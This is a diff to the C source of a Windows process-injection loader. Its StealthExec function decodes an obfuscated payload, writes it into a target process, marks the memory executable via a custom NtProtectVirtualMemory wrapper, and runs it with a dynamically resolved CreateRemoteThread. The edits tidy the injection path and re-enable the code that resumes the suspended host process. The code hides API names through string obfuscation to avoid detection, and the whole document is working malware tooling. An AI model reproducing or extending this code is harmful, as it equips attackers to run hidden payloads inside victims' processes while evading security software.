@@ -10,7 +10,9 @@ void StealthExec(HANDLE hProc)
     SIZE_T sz = payload_size + 1;
     HANDLE hThreadRemote;
     NTSTATUS status;
+    ULONG oldProtect;
 
+    // Decode the payload
     obfs_decode_binary(DECKEY, payload, payload_size);
 
     status = CustAVM(hProc, &memLoc, 0, &sz, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
@@ -42,17 +44,8 @@ void StealthExec(HANDLE hProc)
         myDebug(DEBUG_SUCCESS, "Successfully write memory.");
     }
     
-    // Change Page Protection
-    ULONG oldProtect;
-    //status = CustPVM(hProc, &memLoc, &sz, (ULONG)0x40 , &oldProtect);
-    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
-    PNtProtectVirtualMemory myNtProtect =  (PNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
-    
-    if (!myNtProtect) {
-        myDebug(DEBUG_ERROR,"Failed to locate NtProtectVirtualMemory.\n");
-        return;
-    }
-    status = myNtProtect(hProc, &memLoc, &sz, PAGE_EXECUTE_READWRITE, &oldProtect);
+    // Change Page Protection   
+    status = CustPVM(hProc, &memLoc, &sz, PAGE_EXECUTE_READWRITE , &oldProtect);
     if (status != 0)
     {
         myDebug(DEBUG_ERROR, "Protect Memory change failed (Err: 0x%lX).", status);
@@ -75,9 +68,7 @@ void StealthExec(HANDLE hProc)
         myDebug(DEBUG_SUCCESS, "Successfully resolve CreateRemoteThread.");
     }
 
-    // Load Remote DLL
     hThreadRemote = ((pCRT_t)pCRT)(hProc, NULL, 0, memLoc, NULL, 0, NULL);
-
     if (!hThreadRemote)
     {
         myDebug(DEBUG_ERROR, "Thread creation failed.");
@@ -99,7 +90,7 @@ void StealthExec(HANDLE hProc)
         }
         pResumeThread_t pResumeThread = (pResumeThread_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]ResumeThread"));
         pResumeThread(hThreadRemote);
-        pCloseHandle(hThreadRemote);
+        // pCloseHandle(hThreadRemote);
         myDebug(DEBUG_SUCCESS, "Successfully injected module via RemoteThread");
     }
     return;
@@ -143,11 +134,11 @@ int main(int argc, char *argv[])
     StealthExec(pInfo.hProcess);
 
     // Resume Execution
-    // pResumeThread_t pResumeThread = (pResumeThread_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]ResumeThread"));
-    // pResumeThread(pInfo.hThread);
-    // pCloseHandle_t pCloseHandle = (pCloseHandle_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]CloseHandle"));
-    // pCloseHandle(pInfo.hProcess);
-    // pCloseHandle(pInfo.hThread);
+    pResumeThread_t pResumeThread = (pResumeThread_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]ResumeThread"));
+    pResumeThread(pInfo.hThread);
+    pCloseHandle_t pCloseHandle = (pCloseHandle_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]CloseHandle"));
+    pCloseHandle(pInfo.hProcess);
+    pCloseHandle(pInfo.hThread);
     myDebug(DEBUG_INFO, "%s is now running.", obfs_decode(DECKEY, procName));
 
     return 0;
